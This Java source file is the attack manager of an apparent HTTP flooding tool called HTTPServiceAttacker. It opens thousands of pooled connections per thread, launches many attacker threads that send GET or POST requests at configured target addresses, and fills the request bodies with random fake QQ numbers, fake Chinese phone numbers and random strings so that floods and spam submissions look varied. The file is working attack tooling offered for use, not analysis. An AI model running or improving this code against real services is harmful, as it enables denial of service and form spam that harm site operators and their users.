package com.ishland.app.HTTPServiceAttacker.attacker;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Map;
import java.util.concurrent.TimeUnit;

import org.apache.commons.lang3.RandomStringUtils;
import org.apache.hc.client5.http.ConnectionKeepAliveStrategy;
import org.apache.hc.client5.http.config.RequestConfig;
import org.apache.hc.client5.http.impl.async.CloseableHttpAsyncClient;
import org.apache.hc.client5.http.impl.async.HttpAsyncClients;
import org.apache.hc.client5.http.impl.nio.PoolingAsyncClientConnectionManager;
import org.apache.hc.core5.http.HeaderElement;
import org.apache.hc.core5.http.HttpResponse;
import org.apache.hc.core5.http.impl.DefaultConnectionReuseStrategy;
import org.apache.hc.core5.http.message.BasicHeaderElementIterator;
import org.apache.hc.core5.http.protocol.HttpContext;
import org.apache.hc.core5.reactor.IOReactorConfig;
import org.apache.hc.core5.util.TimeValue;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.ishland.app.HTTPServiceAttacker.attacker.threads.AttackerThread;
import com.ishland.app.HTTPServiceAttacker.attacker.threads.MonitorThread;
import com.ishland.app.HTTPServiceAttacker.configuration.Configuration;

public class Attack {

    private static Configuration config = null;
    public static ArrayList<AttackerThread> thrs = new ArrayList<>();
    private static MonitorThread monitorThread = null;
    private static final Logger logger = LoggerFactory.getLogger("Attack manager");
    private static IOReactorConfig ioReactorConfig = null;
    private static PoolingAsyncClientConnectionManager cm = null;
    public static CloseableHttpAsyncClient httpClient = null;

    public static int maxConnectionPerThread = 4096;

    public static void initClient(int threads) {
	ioReactorConfig = IOReactorConfig.custom().build();
	cm = new PoolingAsyncClientConnectionManager();
	cm.setMaxTotal(threads * Attack.maxConnectionPerThread);
	cm.setDefaultMaxPerRoute(threads * Attack.maxConnectionPerThread);
	RequestConfig defaultRequestConfig = RequestConfig.custom().setConnectTimeout(30000, TimeUnit.MILLISECONDS)
		.setConnectionRequestTimeout(30000, TimeUnit.MILLISECONDS)
		.setResponseTimeout(30000, TimeUnit.MILLISECONDS).build();

	ConnectionKeepAliveStrategy myStrategy = new ConnectionKeepAliveStrategy() {
	    @Override
	    public TimeValue getKeepAliveDuration(HttpResponse response, HttpContext context) {
		BasicHeaderElementIterator it = new BasicHeaderElementIterator(response.headerIterator("connection"));
		while (it.hasNext()) {
		    HeaderElement he = it.next();
		    String param = he.getName();
		    String value = he.getValue();
		    if (value != null && param.equalsIgnoreCase("timeout")) {
			return TimeValue.ofSeconds(Long.parseLong(value));
		    }
		}
		return TimeValue.ofSeconds(60);// 如果没有约定，则默认定义时长�?60s
	    }

	};
	httpClient = HttpAsyncClients.custom().setConnectionReuseStrategy(new DefaultConnectionReuseStrategy())
		.setKeepAliveStrategy(myStrategy).setDefaultRequestConfig(defaultRequestConfig).setConnectionManager(cm)
		.setIOReactorConfig(ioReactorConfig).build();
	httpClient.start();
    }

    public static void startAttack() throws IllegalAccessException {
	logger.info("Starting attack...");
	if (getConfig() == null)
	    throw new IllegalAccessException("Configuration is not set!");
	monitorThread = new MonitorThread();
	monitorThread.start();
	int totalthreads = 0;
	for (int i = 0; i < getConfig().getTarget().size(); i++)
	    totalthreads += Integer.valueOf(String.valueOf(getConfig().getTarget().get(i).get("threads"))).intValue();
	Attack.initClient(totalthreads);
	Iterator<Map<String, Object>> itall = getConfig().getTarget().iterator();
	while (itall.hasNext()) {
	    Map<String, Object> itallmap = itall.next();
	    for (long i = 0; i < Long.valueOf(String.valueOf(itallmap.get("threads"))).longValue(); i++) {
		AttackerThread thr = new AttackerThread();
		if (itallmap.get("mode") == "POST")
		    thr.setMethod(AttackerThread.POST);
		else
		    thr.setMethod(AttackerThread.GET);
		thr.setTarget(String.valueOf(itallmap.get("addr")));
		thr.setData(String.valueOf(itallmap.get("data")));
		thr.setShowExceptions(getConfig().isShowExceptions());
		thr.setReferer(String.valueOf(itallmap.get("referer")));
		thr.start();
		thrs.add(thr);
		thr = null;
	    }
	    itallmap = null;
	}
	itall = null;
	logger.info("Attack started.");
    }

    public static void stopAttack() {
	logger.info("Sending stop signal to all attacker threads...");
	Iterator<AttackerThread> it = thrs.iterator();
	while (it.hasNext())
	    it.next().stopTask();
	it = null;
	logger.info("Waiting for all the threads to die...");
	it = thrs.iterator();
	while (it.hasNext()) {
	    AttackerThread thr = it.next();
	    try {
		thr.join();
	    } catch (InterruptedException e) {
		logger.warn("Could not wait for " + thr.getName() + " to die", e);
	    }
	    thr = null;
	}
	it = null;
	ioReactorConfig = null;
	if (httpClient != null)
	    try {
		httpClient.close();
	    } catch (IOException e1) {
	    }
	httpClient = null;
	cm = null;
	if (monitorThread != null) {
	    monitorThread.stopTask();
	    try {
		monitorThread.join();
	    } catch (InterruptedException e) {
		logger.warn("Could not wait for Monitor Thread to die", e);
	    }
	}
	try {
	    Thread.sleep(100);
	} catch (InterruptedException e) {
	}
	MonitorThread.logging.run();
	monitorThread = null;
	logger.info("Attack stopped.");
    }

    public static String replacePlaceHolders(String origin) {
	String result = new String(origin);
	result = result.replaceAll("\\[QQ\\]", RandomStringUtils.randomNumeric(5, 10));
	result = result.replaceAll("\\[86Phone\\]", "1" + RandomStringUtils.randomNumeric(10));
	result = result.replaceAll("\\[time_sec\\]", String.valueOf((long) System.currentTimeMillis() / 1000));
	for (int i = 1; i <= 32; i++) {
	    result = result.replaceAll("\\[Ascii_" + String.valueOf(i) + "\\]", RandomStringUtils.randomAscii(i));
	    result = result.replaceAll("\\[Number_" + String.valueOf(i) + "\\]", RandomStringUtils.randomNumeric(i));
	    result = result.replaceAll("\\[Alpha_" + String.valueOf(i) + "\\]", RandomStringUtils.randomAlphabetic(i));
	    result = result.replaceAll("\\[NumAlp_" + String.valueOf(i) + "\\]",
		    RandomStringUtils.randomAlphanumeric(i));
	}
	return result;
    }

    /**
     * @return the config
     */
    public static Configuration getConfig() {
	return config;
    }

    /**
     * @param config the config to set
     */
    public static void setConfig(Configuration config) {
	Attack.config = config;
    }

}
